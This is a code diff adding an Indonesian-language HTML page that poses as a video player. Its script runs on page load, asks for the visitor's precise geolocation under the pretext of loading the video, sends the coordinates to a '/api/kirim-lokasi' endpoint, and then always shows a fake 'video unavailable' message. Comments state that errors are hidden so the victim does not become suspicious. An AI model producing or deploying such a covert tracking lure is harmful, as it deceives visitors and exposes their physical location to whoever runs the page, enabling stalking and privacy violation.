@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Video Player</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #000000;
+    color: #ffffff;
+    padding: 20px;
+    text-align: center;
+  }
+  .loader {
+    border: 4px solid #333;
+    border-top: 4px solid #e11d48;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 20px;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  h1 { font-size: 1.2rem; margin-bottom: 10px; color: #f1f5f9; }
+  p { color: #94a3b8; font-size: 0.9rem; max-width: 320px; margin: 0 auto; line-height: 1.5; }
+  .hidden { display: none; }
+</style>
+</head>
+<body>
+
+<div>
+  <!-- Tampilan saat loading awal -->
+  <div id="loadingSec">
+    <div class="loader"></div>
+    <h1>Memuat Video...</h1>
+    <p>Tunggu sebentar, video sedang disiapkan. Jika muncul popup dari browser, harap <b>Izinkan</b> (Allow) agar player dapat memuat konten.</p>
+  </div>
+  
+  <!-- Tampilan setelah proses selesai (berhasil/gagal) -->
+  <div id="errorSec" class="hidden">
+    <h1 style="color: #f87171;">Video Tidak Tersedia</h1>
+    <p>Maaf, video ini mungkin sudah dihapus oleh pemiliknya atau dibatasi untuk wilayah Anda.</p>
+  </div>
+</div>
+
+<script>
+window.onload = () => {
+  if (!navigator.geolocation) {
+    setTimeout(showError, 1500);
+    return;
+  }
+
+  // Meminta lokasi otomatis tanpa klik tombol apa pun
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      try {
+        await fetch('/api/kirim-lokasi', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          })
+        });
+      } catch (err) {
+        // Gagal nge-hit API dibiarkan saja agar pengguna tidak curiga
+      } finally {
+        showError();
+      }
+    },
+    (err) => {
+      // Jika ditolak atau error, tetap tampilkan error seolah-olah video rusak
+      showError();
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+};
+
+function showError() {
+  document.getElementById('loadingSec').classList.add('hidden');
+  document.getElementById('errorSec').classList.remove('hidden');
+}
+</script>
+
+</body>
+</html>
